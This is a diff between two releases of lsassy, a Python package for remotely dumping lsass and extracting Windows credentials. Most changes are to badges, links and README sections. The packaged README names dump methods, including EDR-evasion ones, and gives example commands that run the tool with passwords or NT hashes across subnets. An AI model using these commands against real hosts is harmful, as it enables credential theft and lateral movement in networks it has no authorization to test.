# Comparing `tmp/lsassy-3.1.8.tar.gz` & `tmp/lsassy-3.1.9.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "lsassy-3.1.8.tar", last modified: Sat Apr  8 11:10:55 2023, max compression
+gzip compressed data, was "lsassy-3.1.9.tar", last modified: Sun Nov  5 17:18:27 2023, max compression
```

## Comparing `lsassy-3.1.8.tar` & `lsassy-3.1.9.tar`

### file list

```diff
@@ -1,65 +1,64 @@
-drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2023-04-08 11:10:55.320265 lsassy-3.1.8/
--rw-r--r--   0 pixis     (1000) pixis     (1000)     1066 2022-06-30 17:04:33.000000 lsassy-3.1.8/LICENSE
--rw-r--r--   0 pixis     (1000) pixis     (1000)    19600 2023-04-08 11:10:55.320265 lsassy-3.1.8/PKG-INFO
--rw-r--r--   0 pixis     (1000) pixis     (1000)    18994 2023-04-08 10:37:24.000000 lsassy-3.1.8/README.md
-drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2023-04-08 11:10:55.308265 lsassy-3.1.8/lsassy/
--rw-r--r--   0 pixis     (1000) pixis     (1000)       22 2023-04-08 10:37:24.000000 lsassy-3.1.8/lsassy/__init__.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     5940 2023-04-08 10:17:31.000000 lsassy-3.1.8/lsassy/console.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     9526 2023-04-08 10:03:00.000000 lsassy-3.1.8/lsassy/core.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     1784 2022-06-30 17:55:32.000000 lsassy-3.1.8/lsassy/credential.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     1526 2023-04-06 21:29:06.000000 lsassy-3.1.8/lsassy/dumper.py
-drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2023-04-08 11:10:55.316265 lsassy-3.1.8/lsassy/dumpmethod/
--rw-r--r--   0 pixis     (1000) pixis     (1000)    14007 2023-04-06 21:29:06.000000 lsassy-3.1.8/lsassy/dumpmethod/__init__.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)      683 2022-06-30 17:55:32.000000 lsassy-3.1.8/lsassy/dumpmethod/comsvcs.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     2787 2023-04-06 21:29:06.000000 lsassy-3.1.8/lsassy/dumpmethod/comsvcs_stealth.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     1163 2022-06-30 17:55:32.000000 lsassy-3.1.8/lsassy/dumpmethod/dllinject.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)      879 2022-06-30 17:55:32.000000 lsassy-3.1.8/lsassy/dumpmethod/dumpert.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)      949 2022-06-30 17:55:32.000000 lsassy-3.1.8/lsassy/dumpmethod/dumpertdll.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)    48810 2023-04-06 21:29:06.000000 lsassy-3.1.8/lsassy/dumpmethod/edrsandblast.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)      962 2022-06-30 17:55:32.000000 lsassy-3.1.8/lsassy/dumpmethod/mirrordump.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)  1394901 2022-06-30 17:55:33.000000 lsassy-3.1.8/lsassy/dumpmethod/mirrordump_embedded.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)      783 2022-06-30 17:55:33.000000 lsassy-3.1.8/lsassy/dumpmethod/nanodump.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)    47635 2022-06-30 17:55:33.000000 lsassy-3.1.8/lsassy/dumpmethod/nanodump_ssp_embedded.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     1067 2022-06-30 17:55:33.000000 lsassy-3.1.8/lsassy/dumpmethod/ppldump.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)   219008 2022-06-30 17:55:33.000000 lsassy-3.1.8/lsassy/dumpmethod/ppldump_embedded.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     1158 2022-06-30 17:55:33.000000 lsassy-3.1.8/lsassy/dumpmethod/procdump.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)   869865 2022-06-30 17:55:33.000000 lsassy-3.1.8/lsassy/dumpmethod/procdump_embedded.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     1236 2022-06-30 17:55:33.000000 lsassy-3.1.8/lsassy/dumpmethod/rawrpc.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)   318984 2022-06-30 17:55:33.000000 lsassy-3.1.8/lsassy/dumpmethod/rawrpc_embedded.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     1575 2022-06-30 17:55:33.000000 lsassy-3.1.8/lsassy/dumpmethod/rdrleakdiag.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     1510 2022-11-09 19:22:32.000000 lsassy-3.1.8/lsassy/dumpmethod/silentprocessexit.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     1788 2022-06-30 17:55:33.000000 lsassy-3.1.8/lsassy/dumpmethod/sqldumper.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     1024 2022-06-30 17:04:33.000000 lsassy-3.1.8/lsassy/dumpmethod/wer.py
-drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2023-04-08 11:10:55.320265 lsassy-3.1.8/lsassy/exec/
--rw-r--r--   0 pixis     (1000) pixis     (1000)      698 2023-04-06 21:29:06.000000 lsassy-3.1.8/lsassy/exec/__init__.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     6667 2023-04-06 21:29:06.000000 lsassy-3.1.8/lsassy/exec/mmc.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     4995 2023-04-06 21:29:06.000000 lsassy-3.1.8/lsassy/exec/smb.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     7622 2023-04-06 21:29:06.000000 lsassy-3.1.8/lsassy/exec/smb_stealth.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     4939 2023-04-06 21:29:06.000000 lsassy-3.1.8/lsassy/exec/task.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     2987 2023-04-06 21:29:06.000000 lsassy-3.1.8/lsassy/exec/wmi.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     9555 2023-04-06 21:29:06.000000 lsassy-3.1.8/lsassy/impacketfile.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     2689 2023-04-08 10:19:42.000000 lsassy-3.1.8/lsassy/logger.py
-drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2023-04-08 11:10:55.320265 lsassy-3.1.8/lsassy/output/
--rw-r--r--   0 pixis     (1000) pixis     (1000)     1418 2023-04-06 21:29:06.000000 lsassy-3.1.8/lsassy/output/__init__.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)      473 2022-06-30 17:04:33.000000 lsassy-3.1.8/lsassy/output/grep_output.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)      878 2022-06-30 17:04:33.000000 lsassy-3.1.8/lsassy/output/json_output.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     2123 2023-04-06 21:29:06.000000 lsassy-3.1.8/lsassy/output/pretty_output.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     2014 2023-04-08 10:36:04.000000 lsassy-3.1.8/lsassy/output/table_output.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     4008 2023-04-06 21:29:06.000000 lsassy-3.1.8/lsassy/parser.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     3407 2023-04-06 21:29:06.000000 lsassy-3.1.8/lsassy/session.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     2244 2022-06-30 17:04:33.000000 lsassy-3.1.8/lsassy/utils.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     5455 2023-04-08 10:28:21.000000 lsassy-3.1.8/lsassy/writer.py
-drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2023-04-08 11:10:55.308265 lsassy-3.1.8/lsassy.egg-info/
--rw-r--r--   0 pixis     (1000) pixis     (1000)    19600 2023-04-08 11:10:55.000000 lsassy-3.1.8/lsassy.egg-info/PKG-INFO
--rw-r--r--   0 pixis     (1000) pixis     (1000)     1455 2023-04-08 11:10:55.000000 lsassy-3.1.8/lsassy.egg-info/SOURCES.txt
--rw-r--r--   0 pixis     (1000) pixis     (1000)        1 2023-04-08 11:10:55.000000 lsassy-3.1.8/lsassy.egg-info/dependency_links.txt
--rw-r--r--   0 pixis     (1000) pixis     (1000)       47 2023-04-08 11:10:55.000000 lsassy-3.1.8/lsassy.egg-info/entry_points.txt
--rw-r--r--   0 pixis     (1000) pixis     (1000)       38 2023-04-08 11:10:55.000000 lsassy-3.1.8/lsassy.egg-info/requires.txt
--rw-r--r--   0 pixis     (1000) pixis     (1000)       13 2023-04-08 11:10:55.000000 lsassy-3.1.8/lsassy.egg-info/top_level.txt
--rw-r--r--   0 pixis     (1000) pixis     (1000)        1 2023-04-08 11:10:55.000000 lsassy-3.1.8/lsassy.egg-info/zip-safe
--rw-r--r--   0 pixis     (1000) pixis     (1000)      879 2023-04-08 10:37:24.000000 lsassy-3.1.8/pyproject.toml
--rw-r--r--   0 pixis     (1000) pixis     (1000)       38 2023-04-08 11:10:55.320265 lsassy-3.1.8/setup.cfg
--rw-r--r--   0 pixis     (1000) pixis     (1000)     1289 2023-04-08 10:37:24.000000 lsassy-3.1.8/setup.py
-drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2023-04-08 11:10:55.320265 lsassy-3.1.8/tests/
--rw-r--r--   0 pixis     (1000) pixis     (1000)        0 2022-06-30 17:06:30.000000 lsassy-3.1.8/tests/__init__.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)       87 2023-04-08 10:37:24.000000 lsassy-3.1.8/tests/test_lsassy.py
+drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2023-11-05 17:18:27.235818 lsassy-3.1.9/
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     1066 2023-09-06 16:21:52.000000 lsassy-3.1.9/LICENSE
+-rw-r--r--   0 pixis     (1000) pixis     (1000)    19725 2023-11-05 17:18:27.235818 lsassy-3.1.9/PKG-INFO
+-rw-r--r--   0 pixis     (1000) pixis     (1000)    19119 2023-11-05 17:11:30.000000 lsassy-3.1.9/README.md
+drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2023-11-05 17:18:27.227818 lsassy-3.1.9/lsassy/
+-rw-r--r--   0 pixis     (1000) pixis     (1000)       22 2023-11-05 17:11:30.000000 lsassy-3.1.9/lsassy/__init__.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     6042 2023-10-11 23:39:29.000000 lsassy-3.1.9/lsassy/console.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     9839 2023-11-05 17:11:30.000000 lsassy-3.1.9/lsassy/core.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     1784 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/credential.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     1526 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/dumper.py
+drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2023-11-05 17:18:27.235818 lsassy-3.1.9/lsassy/dumpmethod/
+-rw-r--r--   0 pixis     (1000) pixis     (1000)    14036 2023-11-05 17:11:30.000000 lsassy-3.1.9/lsassy/dumpmethod/__init__.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)      683 2023-10-09 18:18:18.000000 lsassy-3.1.9/lsassy/dumpmethod/comsvcs.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     2805 2023-11-05 17:11:30.000000 lsassy-3.1.9/lsassy/dumpmethod/comsvcs_stealth.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     1163 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/dumpmethod/dllinject.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)      879 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/dumpmethod/dumpert.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)      949 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/dumpmethod/dumpertdll.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     8201 2023-11-05 17:11:30.000000 lsassy-3.1.9/lsassy/dumpmethod/edrsandblast.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)      962 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/dumpmethod/mirrordump.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)  1394901 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/dumpmethod/mirrordump_embedded.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)      783 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/dumpmethod/nanodump.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)    47635 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/dumpmethod/nanodump_ssp_embedded.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     1067 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/dumpmethod/ppldump.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)   219008 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/dumpmethod/ppldump_embedded.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     1158 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/dumpmethod/procdump.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)   869865 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/dumpmethod/procdump_embedded.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     1236 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/dumpmethod/rawrpc.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)   318984 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/dumpmethod/rawrpc_embedded.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     1575 2023-10-09 18:08:34.000000 lsassy-3.1.9/lsassy/dumpmethod/rdrleakdiag.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     1510 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/dumpmethod/silentprocessexit.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     1788 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/dumpmethod/sqldumper.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     1024 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/dumpmethod/wer.py
+drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2023-11-05 17:18:27.235818 lsassy-3.1.9/lsassy/exec/
+-rw-r--r--   0 pixis     (1000) pixis     (1000)      698 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/exec/__init__.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     6687 2023-11-05 17:11:30.000000 lsassy-3.1.9/lsassy/exec/mmc.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     4995 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/exec/smb.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     7622 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/exec/smb_stealth.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     4939 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/exec/task.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     2987 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/exec/wmi.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     9568 2023-11-05 17:11:30.000000 lsassy-3.1.9/lsassy/impacketfile.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     2689 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/logger.py
+drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2023-11-05 17:18:27.235818 lsassy-3.1.9/lsassy/output/
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     1418 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/output/__init__.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)      473 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/output/grep_output.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)      878 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/output/json_output.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     5089 2023-11-05 17:11:30.000000 lsassy-3.1.9/lsassy/output/pretty_output.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     2014 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/output/table_output.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     4112 2023-11-05 17:11:30.000000 lsassy-3.1.9/lsassy/parser.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     3407 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/session.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     2244 2023-09-06 16:21:52.000000 lsassy-3.1.9/lsassy/utils.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     6268 2023-11-05 17:11:30.000000 lsassy-3.1.9/lsassy/writer.py
+drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2023-11-05 17:18:27.231818 lsassy-3.1.9/lsassy.egg-info/
+-rw-r--r--   0 pixis     (1000) pixis     (1000)    19725 2023-11-05 17:18:27.000000 lsassy-3.1.9/lsassy.egg-info/PKG-INFO
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     1437 2023-11-05 17:18:27.000000 lsassy-3.1.9/lsassy.egg-info/SOURCES.txt
+-rw-r--r--   0 pixis     (1000) pixis     (1000)        1 2023-11-05 17:18:27.000000 lsassy-3.1.9/lsassy.egg-info/dependency_links.txt
+-rw-r--r--   0 pixis     (1000) pixis     (1000)       47 2023-11-05 17:18:27.000000 lsassy-3.1.9/lsassy.egg-info/entry_points.txt
+-rw-r--r--   0 pixis     (1000) pixis     (1000)       38 2023-11-05 17:18:27.000000 lsassy-3.1.9/lsassy.egg-info/requires.txt
+-rw-r--r--   0 pixis     (1000) pixis     (1000)        7 2023-11-05 17:18:27.000000 lsassy-3.1.9/lsassy.egg-info/top_level.txt
+-rw-r--r--   0 pixis     (1000) pixis     (1000)        1 2023-11-05 17:18:27.000000 lsassy-3.1.9/lsassy.egg-info/zip-safe
+-rw-r--r--   0 pixis     (1000) pixis     (1000)      879 2023-11-05 17:11:30.000000 lsassy-3.1.9/pyproject.toml
+-rw-r--r--   0 pixis     (1000) pixis     (1000)       38 2023-11-05 17:18:27.235818 lsassy-3.1.9/setup.cfg
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     1305 2023-11-05 17:11:30.000000 lsassy-3.1.9/setup.py
+drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2023-11-05 17:18:27.235818 lsassy-3.1.9/tests/
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     6527 2023-11-05 17:11:30.000000 lsassy-3.1.9/tests/test_lsassy.py
```

### Comparing `lsassy-3.1.8/LICENSE` & `lsassy-3.1.9/LICENSE`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/PKG-INFO` & `lsassy-3.1.9/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: lsassy
-Version: 3.1.8
+Version: 3.1.9
 Summary: Python library to extract credentials from lsass remotely
 Home-page: https://github.com/Hackndo/lsassy/
 Author: Pixis
 Author-email: hackndo@gmail.com
 License: MIT
 Classifier: Programming Language :: Python :: 3.6
 Classifier: Programming Language :: Python :: 3.7
@@ -13,17 +13,17 @@
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
 Description-Content-Type: text/markdown
 License-File: LICENSE
 
 # lsassy
-[![PyPI version](https://d25lcipzij17d.cloudfront.net/badge.svg?id=py&type=6&v=v3.1.8&x2=0)](https://pypi.org/project/lsassy)
+[![PyPI version](https://d25lcipzij17d.cloudfront.net/badge.svg?id=py&type=6&v=v3.1.9&x2=0)](https://pypi.org/project/lsassy)
 [![PyPI Statistics](https://img.shields.io/pypi/dm/lsassy.svg)](https://pypistats.org/packages/lsassy)
-[![Tests](https://github.com/hackndo/lsassy/workflows/Tests/badge.svg)](https://github.com/hackndo/lsassy/actions?workflow=Tests)
+[![Tests](https://github.com/hackndo/lsassy/actions/workflows/lsassy.yml/badge.svg)](https://github.com/hackndo/lsassy/actions?workflow=lsassy)
 [![Twitter](https://img.shields.io/twitter/follow/hackanddo?label=HackAndDo&style=social)](https://twitter.com/intent/follow?screen_name=hackanddo)
 
 <a href="https://asciinema.org/a/441582?autoplay=1" target="_blank"><img src="https://asciinema.org/a/441582.svg" width="80%"></a>
 
 Python tool to remotely extract credentials on a set of hosts. This [blog post](https://en.hackndo.com/remote-lsass-dump-passwords/) explains how it works.
 
 This tool uses [impacket](https://github.com/SecureAuthCorp/impacket) project to remotely read necessary bytes in lsass dump and [pypykatz](https://github.com/skelsec/pypykatz) to extract credentials.
@@ -32,15 +32,15 @@
 |----------------------------------------------|---------------------------------------------------------|
 | [Warning](#warning)                          | Before using this tool, read this                       |
 | [Installation](#installation)                | Lsassy installation                                     |
 | [Basic usage](#basic-usage)                  | Basic lsassy usage                                      |
 | [Advanced usage](#advanced-usage)            | Advanced lsassy usage with params explaination          |
 | [Add dump method](#add-dump-method)          | How to add a custom lsass dump method                   |
 | [Acknowledgments](#acknowledgments)          | Kudos to these people and tools                         |
-| [Official Discord](#official-discord-channel)| Official Discord channel                                |
+| [Official Discord](#official-discord)        | Official Discord server                                 |
 
 ## Warning
 
 Although I have made every effort to make the tool stable, traces may be left if errors occur.
 
 This tool can either leave some lsass dumps if it failed to delete it (even though it tries hard to do so) or leave a scheduled task running if it fails to delete it. This shouldn't happen, but it might. Now, you know, use it with caution.
 
@@ -499,14 +499,20 @@
 * [MrUn1k0d3r](https://twitter.com/MrUn1k0d3r) for [SMB Service Modification technique](https://raw.githubusercontent.com/Mr-Un1k0d3r/SCShell/master/scshell.py)
 * [th3m4ks](https://twitter.com/th3m4ks) and [Qazeer](https://twitter.com/_Qazeer) for [EDRSandBlast](https://github.com/wavestone-cdt/EDRSandblast)
 * [s4ntiago_p](https://twitter.com/s4ntiago_p) for [nanodump](https://github.com/helpsystems/nanodump)
 * [0gtweet](https://twitter.com/0gtweet) for [Rdrleakdiag technique](https://twitter.com/0gtweet/status/1299071304805560321)
 * [Luis Rocha](https://twitter.com/countuponsec) for [SQLDumper technique](https://twitter.com/countuponsec/status/910969424215232518)
 * [Asaf Gilboa](https://mobile.twitter.com/asaf_gilboa) for [LsassSilentProcessExit technique](https://github.com/deepinstinct/LsassSilentProcessExit)
 
-## Official Discord Channel
+## Official Discord
 
-[![Porchetta Industries](https://discordapp.com/api/guilds/736724457258745996/widget.png?style=banner3)](https://discord.gg/sEkn3aa)
+[https://discord.hackndo.com](https://discord.hackndo.com)
 
 ## Known bugs
 
 * Compiled versions don't include table_output because of some weird error with rich library
+
+## Star History
+
+<a href="https://github.com/hackndo/lsassy/stargazers">
+<img width="500" alt="Star History Chart" src="https://api.star-history.com/svg?repos=hackndo/lsassy&type=Date">
+</a>
```

#### html2text {}

```diff
@@ -1,46 +1,46 @@
-Metadata-Version: 2.1 Name: lsassy Version: 3.1.8 Summary: Python library to
+Metadata-Version: 2.1 Name: lsassy Version: 3.1.9 Summary: Python library to
 extract credentials from lsass remotely Home-page: https://github.com/Hackndo/
 lsassy/ Author: Pixis Author-email: hackndo@gmail.com License: MIT Classifier:
 Programming Language :: Python :: 3.6 Classifier: Programming Language ::
 Python :: 3.7 Classifier: Programming Language :: Python :: 3.8 Classifier:
 Programming Language :: Python :: 3.9 Classifier: License :: OSI Approved ::
 MIT License Classifier: Operating System :: OS Independent Requires-Python:
 >=3.6 Description-Content-Type: text/markdown License-File: LICENSE # lsassy [!
 [PyPI version](https://d25lcipzij17d.cloudfront.net/
-badge.svg?id=py&type=6&v=v3.1.8&x2=0)](https://pypi.org/project/lsassy) [![PyPI
+badge.svg?id=py&type=6&v=v3.1.9&x2=0)](https://pypi.org/project/lsassy) [![PyPI
 Statistics](https://img.shields.io/pypi/dm/lsassy.svg)](https://pypistats.org/
-packages/lsassy) [![Tests](https://github.com/hackndo/lsassy/workflows/Tests/
-badge.svg)](https://github.com/hackndo/lsassy/actions?workflow=Tests) [!
-[Twitter](https://img.shields.io/twitter/follow/
+packages/lsassy) [![Tests](https://github.com/hackndo/lsassy/actions/workflows/
+lsassy.yml/badge.svg)](https://github.com/hackndo/lsassy/
+actions?workflow=lsassy) [![Twitter](https://img.shields.io/twitter/follow/
 hackanddo?label=HackAndDo&style=social)](https://twitter.com/intent/
 follow?screen_name=hackanddo) _[_h_t_t_p_s_:_/_/_a_s_c_i_i_n_e_m_a_._o_r_g_/_a_/_4_4_1_5_8_2_._s_v_g_]Python tool
 to remotely extract credentials on a set of hosts. This [blog post](https://
 en.hackndo.com/remote-lsass-dump-passwords/) explains how it works. This tool
 uses [impacket](https://github.com/SecureAuthCorp/impacket) project to remotely
 read necessary bytes in lsass dump and [pypykatz](https://github.com/skelsec/
 pypykatz) to extract credentials. | Chapters | Description | |-----------------
 -----------------------------|-------------------------------------------------
 --------| | [Warning](#warning) | Before using this tool, read this | |
 [Installation](#installation) | Lsassy installation | | [Basic usage](#basic-
 usage) | Basic lsassy usage | | [Advanced usage](#advanced-usage) | Advanced
 lsassy usage with params explaination | | [Add dump method](#add-dump-method) |
 How to add a custom lsass dump method | | [Acknowledgments](#acknowledgments) |
-Kudos to these people and tools | | [Official Discord](#official-discord-
-channel)| Official Discord channel | ## Warning Although I have made every
-effort to make the tool stable, traces may be left if errors occur. This tool
-can either leave some lsass dumps if it failed to delete it (even though it
-tries hard to do so) or leave a scheduled task running if it fails to delete
-it. This shouldn't happen, but it might. Now, you know, use it with caution. ##
-Installation **lsassy** works with python >= 3.7 ### pip (Recommended) ```bash
-python3 -m pip install lsassy ``` ### From source for development ``` python3
-setup.py install ``` ## Basic Usage **lsassy** works out of the box on multiple
-targets (IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a
-list of targets) ```bash lsassy [-d domain] -u pixis -p P4ssw0rd targets lsassy
-[-d domain] -u pixis -H [LM:]NT targets ``` By default, lsassy will try to dump
+Kudos to these people and tools | | [Official Discord](#official-discord) |
+Official Discord server | ## Warning Although I have made every effort to make
+the tool stable, traces may be left if errors occur. This tool can either leave
+some lsass dumps if it failed to delete it (even though it tries hard to do so)
+or leave a scheduled task running if it fails to delete it. This shouldn't
+happen, but it might. Now, you know, use it with caution. ## Installation
+**lsassy** works with python >= 3.7 ### pip (Recommended) ```bash python3 -
+m pip install lsassy ``` ### From source for development ``` python3 setup.py
+install ``` ## Basic Usage **lsassy** works out of the box on multiple targets
+(IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of
+targets) ```bash lsassy [-d domain] -u pixis -p P4ssw0rd targets lsassy [-
+d domain] -u pixis -H [LM:]NT targets ``` By default, lsassy will try to dump
 lsass remotely using `comsvcs.dll` method, either via WMI or via a remote
 scheduled task. ### Kerberos **lsassy** can authenticate with Kerberos. It
 requires a valid TGT in `KRB5CCNAME` environment variable. See [advanced usage]
 (Lsassy-Advanced-Usage#kerberos) for more details. ```bash lsassy -k targets
 ``` ### Examples ```bash lsassy -d hackn.lab -u pixis -p P4ssw0rd 192.168.1.0/
 24 lsassy -d hackn.lab -u pixis -p P4ssw0rd 192.168.1.1-10 lsassy -d hackn.lab
 -u pixis -p P4ssw0rd hosts.txt lsassy -d hackn.lab -u pixis -p P4ssw0rd
@@ -227,12 +227,11 @@
 [EDRSandBlast](https://github.com/wavestone-cdt/EDRSandblast) * [s4ntiago_p]
 (https://twitter.com/s4ntiago_p) for [nanodump](https://github.com/helpsystems/
 nanodump) * [0gtweet](https://twitter.com/0gtweet) for [Rdrleakdiag technique]
 (https://twitter.com/0gtweet/status/1299071304805560321) * [Luis Rocha](https:/
 /twitter.com/countuponsec) for [SQLDumper technique](https://twitter.com/
 countuponsec/status/910969424215232518) * [Asaf Gilboa](https://
 mobile.twitter.com/asaf_gilboa) for [LsassSilentProcessExit technique](https://
-github.com/deepinstinct/LsassSilentProcessExit) ## Official Discord Channel [!
-[Porchetta Industries](https://discordapp.com/api/guilds/736724457258745996/
-widget.png?style=banner3)](https://discord.gg/sEkn3aa) ## Known bugs * Compiled
+github.com/deepinstinct/LsassSilentProcessExit) ## Official Discord [https://
+discord.hackndo.com](https://discord.hackndo.com) ## Known bugs * Compiled
 versions don't include table_output because of some weird error with rich
-library
+library ## Star History_[_S_t_a_r_ _H_i_s_t_o_r_y_ _C_h_a_r_t_]
```

### Comparing `lsassy-3.1.8/README.md` & `lsassy-3.1.9/README.md`

 * *Files 1% similar despite different names*

```diff
@@ -1,11 +1,11 @@
 # lsassy
-[![PyPI version](https://d25lcipzij17d.cloudfront.net/badge.svg?id=py&type=6&v=v3.1.8&x2=0)](https://pypi.org/project/lsassy)
+[![PyPI version](https://d25lcipzij17d.cloudfront.net/badge.svg?id=py&type=6&v=v3.1.9&x2=0)](https://pypi.org/project/lsassy)
 [![PyPI Statistics](https://img.shields.io/pypi/dm/lsassy.svg)](https://pypistats.org/packages/lsassy)
-[![Tests](https://github.com/hackndo/lsassy/workflows/Tests/badge.svg)](https://github.com/hackndo/lsassy/actions?workflow=Tests)
+[![Tests](https://github.com/hackndo/lsassy/actions/workflows/lsassy.yml/badge.svg)](https://github.com/hackndo/lsassy/actions?workflow=lsassy)
